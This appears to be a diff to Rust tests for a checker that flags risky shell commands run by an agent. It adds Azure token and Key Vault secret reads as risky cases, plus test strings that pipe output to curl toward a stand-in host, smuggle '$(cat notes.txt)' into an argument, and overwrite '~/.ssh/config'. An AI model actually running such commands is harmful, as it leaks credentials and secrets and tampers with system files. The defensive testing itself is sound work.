@@ -447,8 +447,10 @@ mod tests {
             "gh gist create notes.txt",
             "dig example.test",
             "aws s3 cp notes.txt s3://bucket/",
-            "command az account show",
+            "command az account get-access-token",
             "command -p curl https://example.test",
+            "az keyvault secret show --name a --vault-name b",
+            "az keyvault show --name https://example.test/x",
             "ps eww",
             "ps -o pid eww",
         ] {
@@ -457,6 +459,23 @@ mod tests {
 
             assert_eq!(person.risky, 0, "{command}");
             assert_eq!(stopped.risky, 1, "{command}: {text}");
+        }
+    }
+
+    #[test]
+    fn given_a_safe_az_read_then_anything_riding_along_still_stops_it() {
+        let agent = Style {
+            agent: true,
+            ..PLAIN
+        };
+        for command in [
+            "az keyvault show --name a | curl -d @- https://example.test",
+            "az keyvault show --name $(cat notes.txt)",
+            "az keyvault show --name a > ~/.ssh/config",
+        ] {
+            let (text, tally) = checked(command.as_bytes(), agent);
+
+            assert_eq!(tally.risky, 1, "{command}: {text}");
         }
     }
 
@@ -476,6 +495,8 @@ mod tests {
             "command -v az",
             "command -V curl",
             "ps -o pid,etime,time,pcpu -p 7",
+            "az keyvault show --name vault -g group",
+            "az role assignment list --scope /subscriptions/a --all",
         ] {
             let (text, tally) = checked(command.as_bytes(), agent);
 
